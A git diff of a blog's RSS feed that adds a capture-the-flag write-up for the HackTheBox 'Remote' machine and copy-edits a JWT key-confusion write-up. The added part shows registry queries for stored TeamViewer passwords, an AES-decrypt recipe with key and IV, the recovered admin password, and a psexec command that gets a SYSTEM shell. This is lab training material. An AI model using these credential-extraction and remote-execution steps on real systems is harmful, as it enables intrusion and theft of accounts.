903F73317C0BC77FA12A194BB75999319222516
+    SK    REG_BINARY    F82398387864348BAD0DBB41812782B1C0ABB9DAEEF15BC5C3609B2C5652BED7A9A07EA41B3E7CB583A107D39AFFF5E06DF1A06649C07DF4F65BD89DE84289D0F2CBF6B8E92E7B2901782BE8A039F2903552C98437E47E16F75F99C07750AEED8CFC7CD859AE94EC6233B662526D977FFB95DD5EB32D88A4B8B90EC1F8D118A7C6D28F6B5691EB4F9F6E07B6FE306292377ACE83B14BF815C186B7B74FFF9469CA712C13F221460AC6F3A7C5A89FD7C79FF306CEEBEF6DE06D6301D5FD9AB797D08862B9B7D75B38FB34EF82C77C8ADC378B65D9ED77B42C1F4CB1B11E7E7FB2D78180F40C96C1328970DA0E90CDEF3D4B79E08430E546228C000996D846A8489F61FE07B9A71E7FB3C3F811BB68FDDF829A7C0535BA130F04D9C7C09B621F4F48CD85EA97EF3D79A88257D0283BF2B78C5B3D4BBA4307D2F38D3A4D56A2706EDAB80A7CE20E21099E27481C847B49F8E91E53F83356323DDB09E97F45C6D103CF04693106F63AD8A58C004FC69EF8C506C553149D038191781E539A9E4E830579BCB4AD551385D1C9E4126569DD96AE6F97A81420919EE15CF125C1216C71A2263D1BE468E4B07418DE874F9E801DA2054AD64BE1947BE9580D7F0E3C138EE554A9749C4D0B3725904A95AEBD9DACCB6E0C568BFA25EE5649C31551F268B1F2EC039173B7912D6D58AA47D01D9E1B95E3427836A14F71F26E350B908889A95120195CC4FD68E7140AA8BB20E211D15C0963110878AAB530590EE68BF68B42D8EEEB2AE3B8DEC0558032CFE22D692FF5937E1A02C1250D507BDE0F51A546FE98FCED1E7F9DBA3281F1A298D66359C7571D29B24D1456C8074BA570D4D0BA2C3696A8A9547125FFD10FBF662E597A014E0772948F6C5F9F7D0179656EAC2F0C7F
+    LastMACUsed    REG_MULTI_SZ    &lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;005056B0A059
+    MIDInitiativeGUID    REG_SZ    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;514ed376-a4ee-4507-a28b-484604ed0ba0&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    MIDVersion    REG_DWORD    0x1
+    ClientID    REG_DWORD    0x6972e4aa
+    CUse    REG_DWORD    0x1
+    LastUpdateCheck    REG_DWORD    0x64c273d8
+    UsageEnvironmentBackup    REG_DWORD    0x1
+    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
+    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
+    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
+    Security_PasswordStrength    REG_DWORD    0x3
+
+HKEY_LOCAL_MACHINE&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;ccessControl
+HKEY_LOCAL_MACHINE&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;efaultSettings
+
+C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp /v SecurityPasswordExported 
+
+C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 
+
+HKEY_LOCAL_MACHINE&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7
+    StartMenuGroup    REG_SZ    TeamViewer 7
+    InstallationDate    REG_SZ    2020-02-20
+    InstallationDirectory    REG_SZ    C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7
+    Always_Online    REG_DWORD    0x1
+    Security_ActivateDirectIn    REG_DWORD    0x0
+    Version    REG_SZ    7.0.43148
+    ClientIC    REG_DWORD    0x11f25831
+    PK    REG_BINARY    BFAD2AEDB6C89AE0A0FD0501A0C5B9A5C0D957A4CC57C1884C84B6873EA03C069CF06195829821E28DFC2AAD372665339488DD1A8C85CDA8B19D0A5A2958D86476D82CA0F2128395673BA5A39F2B875B060D4D52BE75DB2B6C91EDB28E90DF7F2F3FBE6D95A07488AE934CC01DB8311176AEC7AC367AB4332ABD048DBFC2EF5E9ECC1333FC5F5B9E2A13D4F22E90EE509E5D7AF4935B8538BE4A606AB06FE8CC657930A24A71D1E30AE2188E0E0214C8F58CD2D5B43A52549F0730376DD3AE1DB66D1E0EBB0CF1CB0AA7F133148D1B5459C95A24DDEE43A76623759017F21A1BC8AFCD1F56FD0CABB340C9B99EE3828577371B7ADA9A8F967A32ADF6CF062B00026C66F8061D5CFF89A53EAE510620BC822BC6CC615D4DE093BC0CA8F5785131B75010EE5F9B6C228E650CA89697D07E51DBA40BF6FC3B2F2E30BF6F1C01F1BC2386FA226FFFA2BE25AE33FA16A2699A1124D9133F18B50F4DB6EDA2D23C2B949D6D2995229BC03507A62FCDAD55741B29084BD9B176CFAEDAAA9D48CBAF2C192A0875EC748478E51156CCDD143152125AE7D05177083F406703ED44DCACCD48400DD88A568520930BED69FCD672B15CD3646F8621BBC35391EAADBEDD04758EE8FC887BACE6D8B59F61A5783D884DBE362E2AC6EAC0671B6B5116345043257C537D27A8346530F8B7F5E0EBACE9B840E716197D4A0C3D68CFD2126E8245B01E62B4CE597AA3E2074C8AB1A4583B04DBB13F13EB54E64B850742A8E3E8C2FAC0B9B0CF28D71DD41F67C773A19D7B1A2D0A257A4D42FC6214AB870710D5E841CBAFCD05EF13B372F36BF7601F55D98ED054ED0F321AEBA5F91D390FF0E8E5815E6272BA4ABB3C85CF4A8B07851903F73317C0BC77FA12A194BB75999319222516
+    SK    REG_BINARY    F82398387864348BAD0DBB41812782B1C0ABB9DAEEF15BC5C3609B2C5652BED7A9A07EA41B3E7CB583A107D39AFFF5E06DF1A06649C07DF4F65BD89DE84289D0F2CBF6B8E92E7B2901782BE8A039F2903552C98437E47E16F75F99C07750AEED8CFC7CD859AE94EC6233B662526D977FFB95DD5EB32D88A4B8B90EC1F8D118A7C6D28F6B5691EB4F9F6E07B6FE306292377ACE83B14BF815C186B7B74FFF9469CA712C13F221460AC6F3A7C5A89FD7C79FF306CEEBEF6DE06D6301D5FD9AB797D08862B9B7D75B38FB34EF82C77C8ADC378B65D9ED77B42C1F4CB1B11E7E7FB2D78180F40C96C1328970DA0E90CDEF3D4B79E08430E546228C000996D846A8489F61FE07B9A71E7FB3C3F811BB68FDDF829A7C0535BA130F04D9C7C09B621F4F48CD85EA97EF3D79A88257D0283BF2B78C5B3D4BBA4307D2F38D3A4D56A2706EDAB80A7CE20E21099E27481C847B49F8E91E53F83356323DDB09E97F45C6D103CF04693106F63AD8A58C004FC69EF8C506C553149D038191781E539A9E4E830579BCB4AD551385D1C9E4126569DD96AE6F97A81420919EE15CF125C1216C71A2263D1BE468E4B07418DE874F9E801DA2054AD64BE1947BE9580D7F0E3C138EE554A9749C4D0B3725904A95AEBD9DACCB6E0C568BFA25EE5649C31551F268B1F2EC039173B7912D6D58AA47D01D9E1B95E3427836A14F71F26E350B908889A95120195CC4FD68E7140AA8BB20E211D15C0963110878AAB530590EE68BF68B42D8EEEB2AE3B8DEC0558032CFE22D692FF5937E1A02C1250D507BDE0F51A546FE98FCED1E7F9DBA3281F1A298D66359C7571D29B24D1456C8074BA570D4D0BA2C3696A8A9547125FFD10FBF662E597A014E0772948F6C5F9F7D0179656EAC2F0C7F
+    LastMACUsed    REG_MULTI_SZ    &lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;005056B0A059
+    MIDInitiativeGUID    REG_SZ    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;514ed376-a4ee-4507-a28b-484604ed0ba0&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    MIDVersion    REG_DWORD    0x1
+    ClientID    REG_DWORD    0x6972e4aa
+    CUse    REG_DWORD    0x1
+    LastUpdateCheck    REG_DWORD    0x64c273d8
+    UsageEnvironmentBackup    REG_DWORD    0x1
+    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
+    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
+    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
+    Security_PasswordStrength    REG_DWORD    0x3
+
+HKEY_LOCAL_MACHINE&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;ccessControl
+HKEY_LOCAL_MACHINE&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;efaultSettings
+
+C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 
+
+C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 /v SecurityPasswordExported 
+
+
+
+C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 /v ServerPasswordAES  
+
+
+
+C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 /v ProxyPasswordAES 
+
+
+
+C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 /v LicenseKeyAES 
+
+
+
+C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 /v OptionsPassword 
+
+
+
+C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;reg query HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;OW6432Node&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;ersion7 /v PermanentPassword 
+
+
+
+C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;REM CYBERCHEF RECIPE  
+
+C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt;REM AES_Decrypt&lt;span class=&quot;o&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;option&apos;&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;&apos;Hex&apos;&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;string&apos;&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;&apos;0602000000a400005253413100040000&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;option&apos;&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;&apos;Hex&apos;&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;string&apos;&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;&apos;0100010067244F436E6762F25EA8D704&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;CBC&apos;&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;Hex&apos;&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;Raw&apos;&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;option&apos;&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;&apos;Hex&apos;&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos;string&apos;&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;})&lt;/span&gt;Decode_text&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;UTF-16LE (1200)&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+PS C:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&amp;gt; The system was unable to find the specified registry key or value.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From this huge output, we find three things: first, the encrypted HEX password is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B&lt;/code&gt;. Second, we have the AES encryption key, which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0602000000a400005253413100040000&lt;/code&gt;. Finally, we have the IV, which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0100010067244F436E6762F25EA8D704&lt;/code&gt;. We can go to &lt;a href=&quot;https://gchq.github.io&quot;&gt;Cyberchef&lt;/a&gt; and select AES decrypt recipe. Here is the result:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/remote-htb5.png&quot; alt=&quot;cyberchef decrypt AES&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Showing the admin password is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!R3m0te!&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;
+
+&lt;p&gt;Now that we have the admin password, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec.py&lt;/code&gt;, as stated by the machine info, to get the SYSTEM shell. To do so, we simply run:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;psexec.py &lt;span class=&quot;s1&quot;&gt;&apos;administrator:!R3m0te!@10.129.14.142&apos;&lt;/span&gt;
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Requesting shares on 10.129.14.142.....
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Found writable share ADMIN&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Uploading file lAgjnpRc.exe
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Opening SVCManager on 10.129.14.142.....
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Creating service eGkl on 10.129.14.142.....
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting service eGkl.....
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands
+Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.17763.107]
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2018 Microsoft Corporation. All rights reserved.
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And voilà! We have our SYSTEM shell! Now, we retrieve all flags:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;c:&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;ublic&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ser.txt
+aa3d4bb0861760843cb76a9d9f92190a
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;c:&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;oot.txt
+a033160985b82a79d7188f9c1974a8fc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;
+
+&lt;p&gt;In this CTF, we learned a bit more Common Vulnerabilities: one regarding outdated Umbraco CMS; and the other, a CVE that retrieves TeamViewer password hases that can later be used to get the SYSTEM shell. Nothing too fancy, yet super thoughtful!&lt;/p&gt;
+
+&lt;p&gt;I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Sat, 06 Jan 2024 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000//remote-htb</link>
+        <link href="http://localhost:4000/remote-htb"/>
+        <guid isPermaLink="true">http://localhost:4000/remote-htb</guid>
+      </item>
+    
+      <item>
         <title>Under Construction - HackTheBox</title>
         <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
 
@@ -111,10 +575,10 @@ Archive:  Under Construction.zip
 
 &lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;
 
-&lt;p&gt;What are the things we need to know? First and foremost, we need to understand what are JWTs (JSON Web Tokens).&lt;/p&gt;
+&lt;p&gt;What are the things we need to know? First and foremost, we need to understand what JWTs are.&lt;/p&gt;
 
 &lt;h3 id=&quot;json-web-tokens&quot;&gt;JSON Web Tokens&lt;/h3&gt;
-&lt;p&gt;JWTs are tokens that define a self-secure way for transmitting information - as a JSON object - between users and the server. The form of a this JSON object consists of three partes separated by dots:&lt;/p&gt;
+&lt;p&gt;JWTs are tokens that define a self-secure way for transmitting information - as a JSON object - between users and the server. The form of a this JSON object consists of three parts separated by dots:&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Header&lt;/li&gt;
@@ -144,7 +608,7 @@ Archive:  Under Construction.zip
   &lt;li&gt;Signature&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;And finally, the signature, which is the part of JWTs that ensures the token’s integrity and authenticity. The format of a JWT is like:&lt;/p&gt;
+&lt;p&gt;And finally, the signature, which is the part of JWTs that ensures the token’s integrity and authenticity. The format JWTs take is:&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;header-encoded&amp;gt;.&amp;lt;payload-encoded&amp;gt;.&amp;lt;signature&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -157,7 +621,7 @@ Archive:  Under Construction.zip
 
 &lt;p&gt;&lt;img src=&quot;../figs/underc8.png&quot; alt=&quot;jwt.io decoder&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;In the payload we are receiving our username and a RSA public key, from what it seems. I also noticed that once we log in, our username is displayed on the webpage:&lt;/p&gt;
+&lt;p&gt;In the payload we are receiving our username and an RSA public key, from what it seems. I also noticed that once we log in, our username is displayed on the webpage:&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;../figs/underc9.png&quot; alt=&quot;authenticated challenge front page&quot; /&gt;&lt;/p&gt;
 
@@ -175,11 +639,11 @@ Archive:  Under Construction.zip
 
 &lt;p&gt;&lt;img src=&quot;../figs/underc10.png&quot; alt=&quot;DBHelper.js&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Upon a quick search, I’ve found &lt;a href=&quot;https://knowledge-base.secureflag.com/vulnerabilities/sql_injection/sql_injection_nodejs.html&quot;&gt;this&lt;/a&gt; page about the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get&lt;/code&gt; method used to query the database. We can see that their example shows that the construction of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getUser&lt;/code&gt; method here is prone to SQL injection. This is because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt; is being passed directly into the SQL query, and not as a parameter. Back to index.js, we find that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getUser&lt;/code&gt; is being called when someone access the / path, which fetches the username through the JWT token.&lt;/p&gt;
+&lt;p&gt;Upon a quick search, I’ve found &lt;a href=&quot;https://knowledge-base.secureflag.com/vulnerabilities/sql_injection/sql_injection_nodejs.html&quot;&gt;this&lt;/a&gt; page about the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get&lt;/code&gt; method used to query the database. We can see in their example a similarity with the construction of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getUser&lt;/code&gt; method in the DBHelper.js, indicating a SQL injection. This is because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt; is being passed directly into the SQL query, and not as a parameter. Back to index.js, we find that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getUser&lt;/code&gt; is being called when someone access the / path, which then fetches the username through the JWT token.&lt;/p&gt;
 
 &lt;h3 id=&quot;public-key&quot;&gt;Public Key?&lt;/h3&gt;
 
-&lt;p&gt;This looked odd to me, so I had to do a good research. My first research point was on &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#change-the-algorithm-rs256-asymmetric-to-hs256-symmetric-cve-2016-5431-cve-2016-10555&quot;&gt;HackTricks&lt;/a&gt;, which showed a probably attack vector. With further investigation, I found the &lt;a href=&quot;https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens&quot;&gt;OWASP&lt;/a&gt; webpage explaining this attack. The attack is called “Public Key Confusion”. Some conditions must be met in order to make it work:&lt;/p&gt;
+&lt;p&gt;This looked odd to me, so I had to do a good research. My first stop was at &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#change-the-algorithm-rs256-asymmetric-to-hs256-symmetric-cve-2016-5431-cve-2016-10555&quot;&gt;HackTricks&lt;/a&gt;, which showed a probably attack vector. With further investigation, I found this &lt;a href=&quot;https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens&quot;&gt;OWASP&lt;/a&gt; article, which explains this attack. The attack is called “Public Key Confusion”. Some conditions must be met in order to make it work:&lt;/p&gt;
 
 &lt;ol&gt;
   &lt;li&gt;The server must expect a JWT to be signed with a public key (RSxxx or ESxxx).&lt;/li&gt;
@@ -187,7 +651,7 @@ Archive:  Under Construction.zip
   &lt;li&gt;The public key used to verify the JWT must be available.&lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;p&gt;The attack happens because the server uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jwt.verify&lt;/code&gt; erroneously if the algorithm is changed from RSxxx to HSxxx. HMAC SHA256 is a symmetric encryption method, while RSA isn’t. In this vulnerability, if the algorithms are swapped, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jwt.verify&lt;/code&gt; will make use of the public key as HMAC secret key to decode the JWT and verify it, thus making maliciously crafted token to be accepted by the application.&lt;/p&gt;
